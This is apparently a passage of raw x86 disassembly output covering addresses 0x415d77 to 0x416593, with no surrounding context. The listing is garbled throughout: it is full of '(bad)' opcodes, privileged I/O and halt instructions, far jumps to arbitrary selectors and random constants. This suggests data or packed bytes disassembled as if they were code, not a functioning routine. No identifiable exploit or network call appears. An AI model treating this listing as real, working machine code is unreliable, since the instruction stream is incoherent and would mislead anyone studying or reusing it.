  415d77:	adc    dl,BYTE PTR [ebp-0x7]
  415d7a:	lds    esp,FWORD PTR [edi-0x97736ce]
  415d80:	jl     0x415d23
  415d82:	mov    bh,0xef
  415d84:	repz cmp DWORD PTR [eax-0x567ac23d],0xca93f2b6
  415d8f:	jae    0x415da1
  415d91:	stos   BYTE PTR es:[edi],al
  415d92:	test   eax,ebp
  415d94:	adc    edi,DWORD PTR [ebp-0x6c9ec4e]
  415d9a:	cli    
  415d9b:	push   ds
  415d9c:	pop    ss
  415d9d:	adc    eax,0xf49ca239
  415da2:	ds sti 
  415da4:	add    dh,bh
  415da6:	push   cs
  415da7:	mov    al,BYTE PTR [esi+ebx*4+0x46]
  415dab:	test   DWORD PTR [ebx],ebx
  415dad:	push   0x7a
  415daf:	jb     0x415e1a
  415db1:	sub    eax,0xab9080ea
  415db6:	cwde   
  415db7:	xor    DWORD PTR [ecx+0x25ada689],edi
  415dbd:	xchg   ebx,eax
  415dbe:	mov    edx,0x7d2bace
  415dc3:	stc    
  415dc4:	popa   
  415dc5:	jmp    0x415d4f
  415dc7:	mov    eax,ds:0x2590b407
  415dcc:	clc    
  415dcd:	out    0x22,al
  415dcf:	sbb    DWORD PTR [esi+0x2e291ac9],esi
  415dd5:	loopne 0x415e56
  415dd7:	repnz pop ebx
  415dd9:	mov    dl,0x30
  415ddb:	inc    ebx
  415ddc:	push   es
  415ddd:	mov    cl,0x24
  415ddf:	add    al,0x4a
  415de1:	loope  0x415e2d
  415de3:	fstp   st(5)
  415de5:	iret   
  415de6:	ins    DWORD PTR es:[edi],dx
  415de7:	aaa    
  415de8:	and    ah,0x54
  415deb:	adc    bl,BYTE PTR [esi]
  415ded:	cmc    
  415dee:	mov    cl,0x15
  415df0:	iret   
  415df1:	lock ds cld 
  415df4:	cld    
  415df5:	adc    BYTE PTR [eax-0xffe5853],bh
  415dfb:	sub    eax,0x85a2b15
  415e00:	xchg   ebx,eax
  415e01:	jmp    0x520d0971
  415e06:	pusha  
  415e07:	(bad)  
  415e08:	ds add eax,0x42b4f28e
  415e0e:	pop    edx
  415e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e10:	arpl   WORD PTR [edi-0x75409ff6],cx
  415e16:	call   0xaa40:0xddf881e8
  415e1d:	sbb    al,0xc4
  415e1f:	dec    ecx
  415e20:	(bad)  
  415e21:	pusha  
  415e22:	or     al,0xfa
  415e24:	in     eax,dx
  415e25:	xchg   edi,eax
  415e26:	cmp    ebp,DWORD PTR [edx+eax*1-0x5c587af3]
  415e2d:	cwde   
  415e2e:	cli    
  415e2f:	mov    ebx,0xe0c854d8
  415e34:	and    cl,0x9b
  415e37:	sti    
  415e38:	outs   dx,DWORD PTR ds:[esi]
  415e39:	retf   0x6ba2
  415e3c:	aas    
  415e3d:	aas    
  415e3e:	fisubr DWORD PTR [esi+0x24230784]
  415e44:	jmp    0x4e60:0x465b8bee
  415e4b:	adc    DWORD PTR [esi],0xf1122053
  415e51:	sbb    al,0xe8
  415e53:	fwait
  415e54:	ja     0x415deb
  415e56:	ds aam 0xc0
  415e59:	mov    esi,0xa36fc010
  415e5e:	dec    ebp
  415e5f:	mov    BYTE PTR [ecx-0x6a],ch
  415e62:	mov    edi,0x165da698
  415e67:	ror    BYTE PTR [ebx+0x62],0x7
  415e6b:	or     esi,esp
  415e6d:	inc    esi
  415e6e:	inc    edi
  415e6f:	rcr    DWORD PTR [eax-0x1f4a0746],1
  415e75:	ins    BYTE PTR es:[edi],dx
  415e76:	sbb    eax,0x26
  415e79:	jmp    DWORD PTR [edx]
  415e7b:	ja     0x415e8c
  415e7d:	pop    eax
  415e7e:	push   0xda96ff21
  415e83:	lahf   
  415e84:	scas   eax,DWORD PTR es:[edi]
  415e85:	add    eax,0x32bd23a8
  415e8a:	or     BYTE PTR [ebx-0x4f31721d],ch
  415e90:	jns    0x415efe
  415e92:	inc    ebp
  415e93:	fmul   QWORD PTR [eax-0x49]
  415e96:	mov    ah,0x6
  415e98:	dec    edi
  415e99:	mov    bl,0x57
  415e9b:	mov    WORD PTR [eax+0x71773e8a],?
  415ea1:	push   esi
  415ea2:	cmp    ebp,DWORD PTR [esp+edi*8]
  415ea5:	adc    al,0xe3
  415ea7:	mov    dh,0xe1
  415ea9:	xchg   ecx,eax
  415eaa:	test   BYTE PTR [esi-0x5de8d70f],ah
  415eb0:	push   esi
  415eb1:	and    ecx,edi
  415eb3:	mov    al,0xb6
  415eb5:	loop   0x415e9a
  415eb7:	fwait
  415eb8:	push   esp
  415eb9:	cmp    DWORD PTR [eax+eiz*4-0x6ca5a0a],ebp
  415ec0:	inc    ebx
  415ec1:	loopne 0x415e9b
  415ec3:	mov    edx,0xa25ccb9a
  415ec8:	lds    ecx,FWORD PTR [edi+0x5d]
  415ecb:	imul   ebx,DWORD PTR [ebx+0x5b],0x65e06e25
  415ed2:	xor    ecx,DWORD PTR [edi-0x68]
  415ed5:	inc    ebp
  415ed6:	adc    dh,dl
  415ed8:	scas   al,BYTE PTR es:[edi]
  415ed9:	popf   
  415eda:	mov    WORD PTR [edi+0x76],?
  415edd:	es js  0x415efc
  415ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ee1:	jg     0x415eac
  415ee3:	dec    cx
  415ee5:	sbb    BYTE PTR [edx-0xa1f149e],al
  415eeb:	sbb    esp,ebp
  415eed:	push   ss
  415eee:	imul   ebp,DWORD PTR [ecx],0x2c
  415ef1:	call   0x2f0f:0x9416ce50
  415ef8:	add    bh,BYTE PTR [ebp-0x40dab539]
  415efe:	sub    al,0x54
  415f00:	adc    ebx,ecx
  415f02:	cs mov esp,0x74927d6f
  415f08:	mov    esi,0xa3d55af9
  415f0d:	retf   
  415f0e:	and    BYTE PTR [edx+esi*1+0x230c6fbc],dl
  415f15:	or     BYTE PTR [ebx],bl
  415f17:	inc    eax
  415f18:	sub    eax,0x6fb3542b
  415f1d:	push   es
  415f1e:	loopne 0x415f24
  415f20:	push   esp
  415f21:	into   
  415f22:	pop    eax
  415f23:	mov    edi,0xea8a6d8
  415f28:	fidivr WORD PTR [edi]
  415f2a:	in     eax,dx
  415f2b:	and    DWORD PTR [ebx],0xffffffcc
  415f2e:	adc    al,0xa6
  415f30:	loope  0x415ee8
  415f32:	(bad)  
  415f33:	loopne 0x415eb6
  415f35:	jne    0x415f10
  415f37:	loope  0x415ef9
  415f39:	fcomp  QWORD PTR [bx+di]
  415f3c:	pusha  
  415f3d:	xor    eax,0x43d0961f
  415f42:	adc    eax,0x33014e1a
  415f47:	xchg   edx,eax
  415f48:	loop   0x415fb1
  415f4a:	dec    ebx
  415f4b:	xlat   BYTE PTR ds:[ebx]
  415f4c:	lods   al,BYTE PTR ds:[esi]
  415f4d:	xor    edx,eax
  415f4f:	sub    BYTE PTR [edi-0x59d619ed],al
  415f55:	jnp    0x415f2a
  415f57:	push   es
  415f58:	cmc    
  415f59:	jns    0x415fbe
  415f5b:	jmp    0x8fa6718
  415f60:	mov    edx,0x15a082e3
  415f65:	popf   
  415f66:	ds cli 
  415f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f69:	test   eax,0xeb7de3dc
  415f6e:	(bad)  
  415f6f:	fistp  QWORD PTR [eax-0x19edc0b7]
  415f75:	xchg   esi,eax
  415f76:	call   0x539e4a1
  415f7b:	cld    
  415f7c:	xor    eax,DWORD PTR [eax+0x38]
  415f7f:	and    al,BYTE PTR [ebp-0x6f]
  415f82:	sub    bl,0xe9
  415f85:	ror    BYTE PTR [ecx+0x30ce5aaf],1
  415f8b:	cmc    
  415f8c:	adc    cl,BYTE PTR [ebx+0x3f]
  415f8f:	xchg   DWORD PTR [ebx+0x2752e98],edi
  415f95:	sti    
  415f96:	push   eax
  415f97:	(bad)
  415f9a:	and    DWORD PTR [esi-0x64ec8934],0x253eb3fb
  415fa4:	and    dl,ah
  415fa6:	mov    ebp,0x86d69693
  415fab:	pop    esp
  415fac:	inc    edx
  415fad:	push   ss
  415fae:	rcl    edx,cl
  415fb0:	inc    ebp
  415fb1:	cmp    al,ah
  415fb3:	das    
  415fb4:	inc    edx
  415fb5:	jnp    0x415fff
  415fb7:	mov    ?,WORD PTR [edi-0x78b0d2a1]
  415fbd:	cmp    DWORD PTR [eax],eax
  415fbf:	ret    
  415fc0:	and    edi,DWORD PTR [edx]
  415fc2:	enter  0x3c25,0xdb
  415fc6:	sub    al,0xa8
  415fc8:	bound  esi,QWORD PTR [edi-0x20dabefd]
  415fce:	add    BYTE PTR [ebx+0x32],dh
  415fd1:	jmp    DWORD PTR [edx+ebx*2]
  415fd4:	test   al,0xcc
  415fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fd7:	jmp    0x9cca:0xb7a08e08
  415fde:	je     0x416039
  415fe0:	sub    bh,BYTE PTR [ebp+0x2b876df7]
  415fe6:	iret   
  415fe7:	xchg   edi,eax
  415fe8:	iret   
  415fe9:	aam    0xad
  415feb:	ja     0x416029
  415fed:	jmp    0x415fc7
  415fef:	(bad)  
  415ff0:	rcl    eax,1
  415ff2:	and    eax,0x468d3b63
  415ff7:	mov    DWORD PTR [ebx-0x30e622de],esp
  415ffd:	or     bh,0x7
  416000:	xchg   ebp,eax
  416001:	je     0x415fbf
  416003:	js     0x415fd6
  416005:	(bad)  
  416006:	mov    esi,0xdd7fba2d
  41600b:	sub    al,0x8e
  41600d:	stos   DWORD PTR es:[edi],eax
  41600e:	or     eax,0x2c95e6a4
  416013:	mov    es,edx
  416015:	or     DWORD PTR [ecx-0x4cda9531],ebp
  41601b:	mov    WORD PTR [edi-0x173ceff8],?
  416021:	imul   esi,DWORD PTR [esi],0xb6297e8a
  416027:	inc    ecx
  416028:	popa   
  416029:	push   ebp
  41602a:	rcr    DWORD PTR [eax+0x23ffde96],1
  416030:	and    DWORD PTR [eax-0x4a],esi
  416033:	sbb    DWORD PTR [edi+edi*2-0x5d999e55],edi
  41603a:	pop    esi
  41603b:	fxch   st(1)
  41603d:	leave  
  41603e:	gs jmp 0x8152fd70
  416044:	add    eax,0xe52822f1
  416049:	jle    0x4160b4
  41604b:	add    DWORD PTR [esp+eax*8-0x63],esi
  41604f:	popf   
  416050:	lods   al,BYTE PTR ds:[esi]
  416051:	jmp    0x4ca2ffcd
  416056:	mov    ds:0xa9c465de,al
  41605b:	cmp    DWORD PTR [edx-0x61f3b425],ecx
  416061:	mov    ch,0x55
  416063:	call   0x6f3e646d
  416068:	add    bh,BYTE PTR [eax]
  41606a:	or     ebx,edx
  41606c:	jmp    0xd40a47a7
  416071:	pushf  
  416072:	mov    bh,0x18
  416074:	sahf   
  416075:	es test al,0xe5
  416078:	adc    eax,0x46ca1370
  41607d:	sti    
  41607e:	sbb    DWORD PTR es:[esi+0x779fbbc8],ebp
  416085:	mov    ebp,0x97349a83
  41608a:	jns    0x416082
  41608c:	rol    esi,cl
  41608e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41608f:	mov    DWORD PTR [ecx-0x6502b75a],ebp
  416095:	repz in eax,0x6
  416098:	lds    edi,FWORD PTR ds:0xad8eca88
  41609e:	icebp  
  41609f:	and    al,0xab
  4160a1:	xchg   esp,eax
  4160a2:	lock cwde 
  4160a4:	pop    esp
  4160a5:	repnz stos BYTE PTR es:[edi],al
  4160a7:	cdq    
  4160a8:	pushf  
  4160a9:	adc    eax,0xf121928c
  4160ae:	fs hlt 
  4160b0:	fstp   QWORD PTR [edx+0x5cca4b86]
  4160b6:	push   ss
  4160b7:	(bad)  
  4160b8:	pop    ss
  4160b9:	out    dx,eax
  4160ba:	(bad)  
  4160bb:	mov    dh,al
  4160bd:	in     al,dx
  4160be:	(bad)  
  4160bf:	cmp    al,0x61
  4160c1:	in     eax,dx
  4160c2:	push   ss
  4160c3:	push   0x8dda8384
  4160c8:	mov    ah,0xcc
  4160ca:	enter  0x5eeb,0x5e
  4160ce:	jmp    0xaab47825
  4160d3:	outs   dx,DWORD PTR cs:[esi]
  4160d5:	aad    0x59
  4160d7:	mov    al,ds:0xc5bcf3ee
  4160dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160dd:	jecxz  0x416107
  4160df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160e0:	jle    0x416121
  4160e2:	arpl   WORD PTR [ebx+0x39],bp
  4160e5:	out    0xe6,eax
  4160e7:	push   ebp
  4160e8:	lahf   
  4160e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ea:	cmp    al,0xe2
  4160ec:	and    dl,dl
  4160ee:	inc    esp
  4160ef:	ret    
  4160f0:	adc    eax,DWORD PTR [eax]
  4160f2:	push   ebx
  4160f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160f4:	das    
  4160f5:	out    dx,eax
  4160f6:	fwait
  4160f7:	adc    ah,bl
  4160f9:	stc    
  4160fa:	ins    DWORD PTR es:[edi],dx
  4160fb:	mov    bl,0x98
  4160fd:	mov    ss,WORD PTR [edx-0x5f9826f1]
  416103:	into   
  416104:	(bad)  
  416105:	adc    edx,DWORD PTR [edx]
  416107:	addr16 in al,dx
  416109:	push   eax
  41610a:	hlt    
  41610b:	mov    bh,dl
  41610d:	in     al,0x35
  41610f:	fist   WORD PTR [ecx*4+0x4366ae90]
  416116:	cmp    al,0x7c
  416118:	inc    ebp
  416119:	pop    edi
  41611a:	(bad)  
  41611b:	paddd  mm4,QWORD PTR [edi+esi*4-0x69]
  416120:	in     al,0xd5
  416122:	addr16 lock jb 0x41613d
  416126:	adc    DWORD PTR [ebp+0xb385a6f],eax
  41612c:	jmp    0xa56ea2a8
  416131:	inc    edi
  416132:	jp     0x416142
  416134:	(bad)  
  416135:	(bad)  
  416136:	jmp    0x7ad9:0x234ceb1d
  41613d:	shl    DWORD PTR [ebp+0x56a9bb97],0xd
  416144:	mov    DWORD PTR [ebx-0x11de4a88],eax
  41614a:	sub    BYTE PTR [ecx],ah
  41614c:	push   ds
  41614d:	iret   
  41614e:	jns    0x41618f
  416150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416151:	mov    ecx,0x772c2730
  416156:	jb     0x416128
  416158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416159:	(bad)  
  41615a:	cmp    ah,BYTE PTR [ebp-0x71]
  41615d:	mov    ah,0xd4
  41615f:	and    DWORD PTR [ebp-0x56c3d861],ebx
  416165:	lods   eax,DWORD PTR ds:[esi]
  416166:	mov    ebp,DWORD PTR [edx-0x139d87f7]
  41616c:	xchg   edx,eax
  41616d:	mov    edx,gs
  41616f:	test   BYTE PTR [ebx*2+0x46c0be8b],dh
  416176:	xor    bl,dl
  416178:	jp     0x41611e
  41617a:	mov    ds:0x5a082f4c,al
  41617f:	cmp    eax,0xab4fb1bf
  416184:	adc    DWORD PTR gs:[edi+0x39],esp
  416188:	pop    esi
  416189:	mov    eax,ds:0xc631dc4b
  41618e:	fidiv  DWORD PTR [ebx-0x31]
  416191:	imul   bh
  416193:	cmp    eax,0xc33f645b
  416198:	iret   
  416199:	in     eax,dx
  41619a:	(bad)  
  41619b:	outs   dx,BYTE PTR ds:[esi]
  41619c:	mov    cl,0xc9
  41619e:	into   
  41619f:	add    al,0x9c
  4161a1:	mov    al,0x2c
  4161a3:	out    dx,al
  4161a4:	test   DWORD PTR [ecx+0x6fd35f51],edx
  4161aa:	fs dec ebp
  4161ac:	dec    ecx
  4161ad:	xchg   ebx,eax
  4161ae:	jbe    0x4161e1
  4161b0:	test   BYTE PTR [ebp-0x4fc96de],ch
  4161b6:	ja     0x416158
  4161b8:	shl    BYTE PTR [eax+0x64],cl
  4161bb:	shr    BYTE PTR [edi+edi*2-0x75b74752],0x46
  4161c3:	stos   DWORD PTR es:[edi],eax
  4161c4:	cs pop ebp
  4161c6:	idiv   esp
  4161c8:	add    DWORD PTR [edx+0x27629c4a],esi
  4161ce:	xor    ch,0x67
  4161d1:	mov    esi,0xf7a6f5cb
  4161d6:	jb     0x416254
  4161d8:	cwde   
  4161d9:	arpl   WORD PTR ds:0xf1bf4054,bp
  4161df:	mov    dl,0xdf
  4161e1:	test   DWORD PTR [ebp-0x4b],esi
  4161e4:	shr    BYTE PTR [ecx],cl
  4161e6:	push   esp
  4161e7:	push   ds
  4161e8:	xor    ch,ah
  4161ea:	loope  0x416207
  4161ec:	xor    DWORD PTR [edx-0x36fd79cc],ecx
  4161f2:	mov    ss,WORD PTR [ecx-0x58f5c584]
  4161f8:	rcl    DWORD PTR [edx+0x5a],0xc4
  4161fc:	cmp    BYTE PTR [ebp+0x7f06dabd],0x32
  416203:	cwde   
  416204:	cli    
  416205:	cwde   
  416206:	lods   al,BYTE PTR ds:[esi]
  416207:	add    ebp,DWORD PTR [ebx+ebp*8+0x49863dd2]
  41620e:	scas   eax,DWORD PTR es:[edi]
  41620f:	test   eax,0xf6653d85
  416214:	(bad)  
  416215:	into   
  416216:	or     ch,BYTE PTR [ebx+0x5a]
  416219:	and    dh,dh
  41621b:	(bad)  
  41621c:	pop    esp
  41621d:	aad    0x4
  41621f:	xchg   esp,eax
  416220:	into   
  416221:	test   DWORD PTR [ebp+0x2b],edx
  416224:	aam    0x4e
  416226:	push   es
  416227:	jg     0x4161d4
  416229:	inc    eax
  41622a:	in     eax,dx
  41622b:	cmp    DWORD PTR [edi+0x48],0x3b
  41622f:	mov    ebx,0x2bfa9b6a
  416234:	push   0xffffffb4
  416236:	pop    ds
  416237:	push   esp
  416238:	pop    edx
  416239:	mov    al,0xd8
  41623b:	xor    al,dh
  41623d:	mov    bh,0xa
  41623f:	imul   BYTE PTR ds:0x1284f146
  416245:	add    DWORD PTR [ecx-0x21],esp
  416248:	mov    edi,0x37f0464b
  41624d:	div    DWORD PTR [ebp-0x59f35a04]
  416253:	add    al,ah
  416255:	aaa    
  416256:	push   esi
  416257:	outs   dx,BYTE PTR ds:[esi]
  416258:	xchg   esp,eax
  416259:	popa   
  41625a:	ds inc edx
  41625c:	in     eax,dx
  41625d:	cwde   
  41625e:	or     BYTE PTR [edi-0x467ed4aa],bl
  416264:	lods   eax,DWORD PTR ds:[esi]
  416265:	popa   
  416266:	adc    dh,BYTE PTR [eax+0x40]
  416269:	adc    cl,ch
  41626b:	fild   DWORD PTR [edx+0x2c92e9a8]
  416271:	scas   al,BYTE PTR es:[edi]
  416272:	cmp    eax,0xaaa6cf6c
  416277:	adc    al,0x57
  416279:	mov    bl,0x35
  41627b:	js     0x4162f1
  41627d:	cli    
  41627e:	pop    ds
  41627f:	inc    ecx
  416280:	mov    bh,0xaf
  416282:	fst    QWORD PTR [eax+eax*4+0xdbb9a83]
  416289:	cli    
  41628a:	call   0x38f26fd7
  41628f:	xor    al,0xa2
  416291:	cmp    al,0x85
  416293:	hlt    
  416294:	push   0x114e86ac
  416299:	lea    esp,[ebx-0x3e]
  41629c:	ins    DWORD PTR es:[edi],dx
  41629d:	inc    eax
  41629e:	test   BYTE PTR [ecx+0x17],0xfd
  4162a2:	pusha  
  4162a3:	lods   eax,DWORD PTR ds:[esi]
  4162a4:	ds out 0xcd,eax
  4162a7:	push   ebx
  4162a8:	lods   al,BYTE PTR ds:[esi]
  4162a9:	ds cmp dh,al
  4162ac:	(bad)  [edx]
  4162ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162af:	mov    eax,0xc4f4aabd
  4162b4:	mov    ebx,0x80bc906e
  4162b9:	(bad)  
  4162ba:	xor    DWORD PTR [esi+0x56e08f92],ebx
  4162c0:	push   0x1e2ab33c
  4162c5:	adc    esi,ecx
  4162c7:	cli    
  4162c8:	das    
  4162c9:	add    dh,ch
  4162cb:	and    BYTE PTR [esi-0x5a],0x8f
  4162cf:	stc    
  4162d0:	dec    eax
  4162d1:	iret   
  4162d2:	adc    ebx,DWORD PTR [esi]
  4162d4:	pop    ebx
  4162d5:	hlt    
  4162d6:	fwait
  4162d7:	cmp    edi,DWORD PTR [eax-0x50]
  4162da:	adc    DWORD PTR [edi+0x43cf4c14],eax
  4162e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e1:	cwde   
  4162e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e3:	jge    0x416321
  4162e5:	push   esi
  4162e6:	xchg   edi,eax
  4162e7:	bound  eax,QWORD PTR [ecx-0x95711]
  4162ed:	jbe    0x416305
  4162ef:	cwde   
  4162f0:	mov    al,ds:0xfb7d6af0
  4162f5:	div    BYTE PTR [edx-0x4f5c0c14]
  4162fb:	test   BYTE PTR [ecx],ch
  4162fd:	loop   0x416309
  4162ff:	adc    eax,0x95b7252a
  416304:	mov    ah,0xd4
  416306:	mov    ds:0x22063768,eax
  41630b:	push   esp
  41630c:	sub    ch,0x37
  41630f:	jmp    0x6424:0x6d34f93c
  416316:	xchg   ecx,eax
  416317:	call   0x7ae7:0xa5a62c70
  41631e:	sbb    ah,BYTE PTR [ebx+ecx*1-0x2d]
  416322:	sbb    al,0xa
  416324:	fnsave [ebx-0x17]
  416327:	outs   dx,DWORD PTR ds:[esi]
  416328:	push   0x8
  41632a:	jge    0x4162de
  41632c:	jmp    ebx
  41632e:	idiv   DWORD PTR [ebp-0x1dbfc749]
  416334:	xor    ebp,ecx
  416336:	pusha  
  416337:	dec    ecx
  416338:	aam    0x1d
  41633a:	fimul  WORD PTR [edi-0x1c]
  41633d:	or     DWORD PTR [ecx+0x72b3f1f0],ecx
  416343:	bound  edi,QWORD PTR [esi-0x4ad2e782]
  416349:	test   eax,0x40332664
  41634e:	push   cs
  41634f:	aam    0x68
  416351:	into   
  416352:	inc    edx
  416353:	scas   al,BYTE PTR es:[edi]
  416354:	jo     0x4163a9
  416356:	or     eax,0xac165a4e
  41635b:	rcr    DWORD PTR [edi*4-0x38d7adca],cl
  416362:	push   ebp
  416363:	inc    ecx
  416364:	and    DWORD PTR [ecx-0x3db05d5a],ebx
  41636a:	xchg   edi,eax
  41636b:	adc    bh,al
  41636d:	fwait
  41636e:	mov    ah,dh
  416370:	inc    eax
  416371:	or     DWORD PTR [edi],ebx
  416373:	lock sbb DWORD PTR [edi-0x3d],esp
  416377:	pop    eax
  416378:	mov    edx,0xc4af2f80
  41637d:	pusha  
  41637e:	cmp    eax,0x62b7a3e7
  416383:	mov    al,0x7e
  416385:	out    dx,al
  416386:	in     al,dx
  416387:	fnsave [ecx-0x593ce357]
  41638d:	retf   
  41638e:	movzx  eax,dx
  416391:	mov    bl,0xd3
  416393:	mov    edi,0x7759e80
  416398:	xchg   ecx,eax
  416399:	mov    ah,0x60
  41639b:	mov    ds:0xb40fb700,al
  4163a0:	cs cmc 
  4163a2:	or     DWORD PTR [eax+0x670eced7],edi
  4163a8:	lea    esp,[ecx+esi*1-0x64e7e12]
  4163af:	or     al,0x4c
  4163b1:	popa   
  4163b2:	shl    DWORD PTR [edx+0x75a689a9],1
  4163b8:	or     edx,DWORD PTR [ecx]
  4163ba:	mov    cl,0x8c
  4163bc:	xchg   esp,eax
  4163bd:	push   ss
  4163be:	pop    ebp
  4163bf:	and    DWORD PTR [eax],esp
  4163c1:	mov    edi,0x120270d8
  4163c6:	adc    DWORD PTR [ebx-0x48],ebx
  4163c9:	mov    DWORD PTR [edi+ecx*1],eax
  4163cc:	outs   dx,BYTE PTR ds:[esi]
  4163cd:	mov    BYTE PTR [eax-0x57],cl
  4163d0:	leave  
  4163d1:	repz or al,0xd7
  4163d4:	cmp    BYTE PTR [edi],dh
  4163d6:	pop    ebp
  4163d7:	aad    0xfe
  4163d9:	push   edx
  4163da:	mov    ah,0x1c
  4163dc:	out    0x7,eax
  4163de:	test   DWORD PTR [ebx-0x5d],esp
  4163e1:	push   ebx
  4163e2:	xchg   edi,eax
  4163e3:	lods   al,BYTE PTR ds:[esi]
  4163e4:	lods   al,BYTE PTR ds:[esi]
  4163e5:	sahf   
  4163e6:	jmp    0xa4b61e7d
  4163eb:	rol    esp,cl
  4163ed:	jbe    0x4163b2
  4163ef:	dec    esi
  4163f0:	push   esi
  4163f1:	hlt    
  4163f2:	and    DWORD PTR [esi-0x16],eax
  4163f5:	cmp    esp,edx
  4163f7:	adc    BYTE PTR [ebx-0x3c],0x5f
  4163fb:	jno    0x416413
  4163fd:	cmc    
  4163fe:	jp     0x416431
  416400:	out    0x74,al
  416402:	adc    BYTE PTR [ebp-0x52],bl
  416405:	mov    es:0xb002cb9e,al
  41640b:	dec    edx
  41640c:	dec    ecx
  41640d:	adc    esi,DWORD PTR [edx+0x1]
  416410:	lahf   
  416411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416412:	sbb    eax,0x565800d5
  416417:	ins    DWORD PTR es:[edi],dx
  416418:	cmp    eax,0x8df33e47
  41641d:	iret   
  41641e:	xor    al,0xe2
  416420:	shl    BYTE PTR [eax],1
  416422:	movq   QWORD PTR [edx-0x2d],mm7
  416426:	addr16 pop eax
  416428:	xor    ebx,DWORD PTR [ecx+0x11eeff29]
  41642e:	inc    ecx
  41642f:	and    eax,ecx
  416431:	imul   cl
  416433:	cwde   
  416434:	push   esp
  416435:	mov    al,ds:0x35b7178c
  41643a:	lea    edi,[edx+edi*2+0x2]
  41643e:	mov    esp,0x4535ae7b
  416443:	push   esp
  416444:	int    0x80
  416446:	sbb    dl,bl
  416448:	loope  0x4164aa
  41644a:	ret    
  41644b:	and    al,0xf3
  41644d:	das    
  41644e:	fldcw  WORD PTR [ebp-0x514fd103]
  416454:	pop    edi
  416455:	aas    
  416456:	and    al,0x7a
  416458:	test   eax,0x91ef0cf0
  41645d:	mov    ebx,0xb0170556
  416462:	xor    esi,edx
  416464:	xchg   edi,eax
  416465:	call   0x6304:0x7f4e479e
  41646c:	sti    
  41646d:	dec    esp
  41646e:	enter  0x4e21,0xf8
  416472:	fwait
  416473:	je     0x4164e2
  416475:	into   
  416476:	xchg   esi,eax
  416477:	shr    ebx,cl
  416479:	repnz inc eax
  41647b:	in     al,dx
  41647c:	ret    
  41647d:	and    eax,0xb27d0948
  416482:	imul   ebx,edx,0x25d57f84
  416488:	or     eax,0xeb7db6e9
  41648d:	cwde   
  41648e:	mov    ds:0x59cc5987,eax
  416493:	repz cmp eax,DWORD PTR [edi*1+0x43621757]
  41649b:	fnstcw WORD PTR [edx]
  41649d:	inc    edx
  41649e:	adc    al,0x12
  4164a0:	mul    DWORD PTR [edi+0x256e7459]
  4164a6:	std    
  4164a7:	(bad)  
  4164a8:	cmp    DWORD PTR [edx+0x49571a74],ecx
  4164ae:	mov    dl,0x7d
  4164b0:	icebp  
  4164b1:	std    
  4164b2:	lds    edi,FWORD PTR [eax-0x49]
  4164b5:	pop    ebx
  4164b6:	bound  edx,QWORD PTR [esp+eax*2]
  4164b9:	lahf   
  4164ba:	sbb    DWORD PTR [eax-0x5545a838],ebx
  4164c0:	pop    edi
  4164c1:	dec    edx
  4164c2:	pop    edi
  4164c3:	dec    edx
  4164c4:	mov    ecx,0x5097bcb9
  4164c9:	push   esp
  4164ca:	not    edi
  4164cc:	adc    ch,BYTE PTR [eax]
  4164ce:	or     eax,DWORD PTR [ebx+eax*2]
  4164d1:	mov    ebx,0x27495b3f
  4164d6:	push   eax
  4164d7:	out    dx,eax
  4164d8:	pusha  
  4164d9:	imul   ebp,ebp,0x39
  4164dc:	in     eax,0xc9
  4164de:	test   al,0xb0
  4164e0:	mov    al,0x2b
  4164e2:	mov    dh,0x29
  4164e4:	ret    
  4164e5:	jl     0x41648a
  4164e7:	ror    dl,0xa6
  4164ea:	mov    WORD PTR [edi],?
  4164ec:	mov    fs,edx
  4164ee:	div    DWORD PTR [edx-0x160f5e14]
  4164f4:	(bad)  
  4164f5:	pop    edi
  4164f6:	(bad)  
  4164f7:	cli    
  4164f8:	cmp    ebx,ebx
  4164fa:	and    edi,DWORD PTR [ebx+0x545bfcae]
  416500:	jns    0x416501
  416502:	mov    ds:0x875808af,eax
  416507:	inc    eax
  416508:	xor    cl,ah
  41650a:	test   eax,0xe88ea041
  41650f:	(bad)  
  416510:	cmc    
  416511:	push   edi
  416512:	inc    esp
  416513:	ja     0x4164da
  416515:	sub    DWORD PTR ds:0x8a643801,0x12e6b504
  41651f:	mov    cl,0xfe
  416521:	mov    cl,0xb
  416523:	call   0xb460:0xf1a9cc9
  41652a:	aaa    
  41652b:	inc    esp
  41652c:	add    ah,ah
  41652e:	jp     0x41658b
  416530:	ins    DWORD PTR es:[edi],dx
  416531:	loope  0x416512
  416533:	ror    BYTE PTR [edi-0x4e2fed5d],1
  416539:	mov    cl,0x34
  41653b:	daa    
  41653c:	and    BYTE PTR [edi],ah
  41653e:	adc    al,0x46
  416540:	clc    
  416541:	sbb    BYTE PTR [edi-0x38],ch
  416544:	aas    
  416545:	add    ecx,DWORD PTR [ebx-0x2b]
  416548:	cmp    ecx,0xa844868
  41654e:	or     eax,0x7a26803b
  416553:	mov    ah,0xc0
  416555:	pop    esi
  416556:	aaa    
  416557:	aaa    
  416558:	and    BYTE PTR [edi+0x6f],ah
  41655b:	cld    
  41655c:	ds mov ebx,0xd9d252d9
  416562:	int3   
  416563:	mov    esi,0x84bd8132
  416568:	fdiv   QWORD PTR [esi]
  41656a:	sub    BYTE PTR [eax+0xfe67f00],bl
  416570:	in     al,dx
  416571:	sub    eax,0x83ac129d
  416576:	inc    ebp
  416577:	sbb    ah,BYTE PTR [edx+0x7c]
  41657a:	shl    DWORD PTR [ebp+0x76747c8c],0x2
  416581:	imul   edi,ebx,0x3eaf6d12
  416587:	sub    bl,bl
  416589:	leave  
  41658a:	(bad)  [ebx]
  41658c:	adc    esp,DWORD PTR [eax]
  41658e:	inc    ebp
  41658f:	mov    dl,0x2b
  416591:	jp     0x416606
  416593:	dec    edi
